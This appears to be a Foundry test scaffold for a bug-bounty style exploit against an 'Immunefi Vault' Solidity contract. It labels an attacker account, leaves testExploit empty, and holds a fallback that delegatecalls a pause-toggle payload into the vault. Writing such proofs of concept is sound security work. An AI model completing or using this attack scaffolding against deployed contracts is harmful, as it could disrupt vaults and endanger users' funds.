// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "lib/Vault/contracts/vault/Vault.sol";

contract VaultTest is Test {

    Vault vault;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(13);
        vm.label(deployer, "Deploying Account (OnlyOwner)");

        attacker = address(60);
        vm.label(attacker, "Attacking Account");

        vm.startPrank(deployer);
        vault = Vault(payable(0xB2429895f04CA8566BC992496d66116641bFF8b1));
        vm.deal(address(vault), 10 ether);
        vm.label(address(vault), "Immunefi Vault Contract");
        vm.stopPrank();
    }

    function testExploit () public {

    }

    fallback () external payable {
        bytes memory payload = 
        abi.encodeWithSignature("setIsPausedOnImmunefi(bool)", !vault.isPausedOnImmunefi());

        address _target = address(vault);

         assembly {
            let succeeded := delegatecall(gas(), _target, add(payload, 0x20), mload(payload), 0, 0)

            switch iszero(succeeded)
                case 1 {
                    // throw if delegatecall failed
                    let size := returndatasize()
                    returndatacopy(0x00, 0x00, size)
                    revert(0x00, size)
                }
         }
    }

}